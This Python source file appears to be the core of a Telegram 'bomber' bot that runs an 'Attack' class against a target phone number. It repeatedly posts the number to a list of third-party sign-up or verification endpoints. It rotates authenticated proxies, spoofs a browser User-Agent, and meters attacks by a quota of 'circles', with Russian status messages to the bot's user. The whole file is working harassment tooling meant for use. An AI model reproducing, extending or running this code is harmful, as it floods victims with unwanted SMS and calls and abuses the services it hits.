import socket
from asyncio import sleep
from random import choice
from loguru import logger
from json import loads
from datetime import datetime as dt

import socks
from aiohttp import ClientSession
from requests.exceptions import ConnectionError, ReadTimeout, SSLError
from aiogram.types import Message

from objects import globals
from temp.headers import headers
#from formats.decode_host import decode_host


@logger.catch
class Attack:
    phone: str
    user_id: int

    def __init__(self, phone="", user_id=None):
        """Initialization

        :param: phone (User phone)
        :type: str
        :param: user_id (User Id)
        :type: int

        """

        self.phone: str = phone
        self.user_id: int = user_id
        self.process_status: bool = True
        self.state_cirlces: int = 0
        self.user_data = None
        self.session: ClientSession = ClientSession()
        self.headers = {"User-Agent": ("Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) "
                                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                                       "Chrome/93.0.4577.63 Safari/537.36")}

    async def start(self, message: Message):
        """Start attack

        :param: message
        :type: Message

        """

        # Get all data sites or services
        self.user_data = await globals.UserData.objects.filter(user_id=self.user_id).all()
        self.state_circles = self.user_data[0].status

        # Check circles count
        if self.state_circles == "∞":
            self.state_circles = "∞"
        elif int(self.state_circles) == 0:
            await globals.bot.delete_message(chat_id=message.chat.id, message_id=message.message_id+1)
            return await message.answer(text="🗑Количество кругов израсходовано!")
        else:
            self.state_circles: int = int(self.state_circles)

        # Load all services
        with open(r"sites/services.json") as services_load:
            services = loads(services_load.read())

        with open(r"sites/proxies.json", "r") as load_proxies:
            proxies = loads(load_proxies.read())

        # Run attack process
        while self.process_status:
            proxy = choice(proxies)
            ip, port, username, password = proxy.split(":")
            await self.proxy_auth(ip, port, username, password)
            for (k, v) in services.items():
                try:
                    if "data" in v.keys():
                        url = k # v["url"] % decode_host(k)
                        data = (v["data"] % self.phone).replace("'", "\"")
                        await self.session.post(url=url, data=loads(data), headers=self.headers)
                    elif "json" in v.keys():
                        url = k # v["url"] % decode_host(k)
                        json = (v["json"] % self.phone).replace("'", "\"")
                        await self.session.post(url=url, json=loads(json), headers=self.headers)
                    else:
                        url = k % self.phone # v["url"] % (decode_host(k), self.phone,)  # Url
                        await self.session.post(url=url)
                except (ConnectionError, ReadTimeout, UnicodeEncodeError, SSLError):
                    pass

            await sleep(5)  # Time-out
            if self.state_circles != "∞":
                if int(self.state_circles) == 0:
                    self.process_status = False
                    await self.session.close()
                    await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())
                    return await message.answer(text=f"❌Атака остановлена\n"f"🗑Количество кругов израсходовано!")
                self.state_circles -= 1

    async def stop(self):
        """Stop attack"""

        # Update count cirlces (handle stoping)
        await self.user_data[0].update(status=str(self.state_circles), last_phone=self.phone, last_created=dt.now())

        self.process_status = False       # Change process status
        await self.session.close()

    async def proxy_auth(self, ip, port, username, password):
        try:
            socks.set_default_proxy(socks.HTTP, ip, int(port), True, username, password)
            socket.socket = socks.socksocket
        except Exception as e:
            logger.error(str(e))
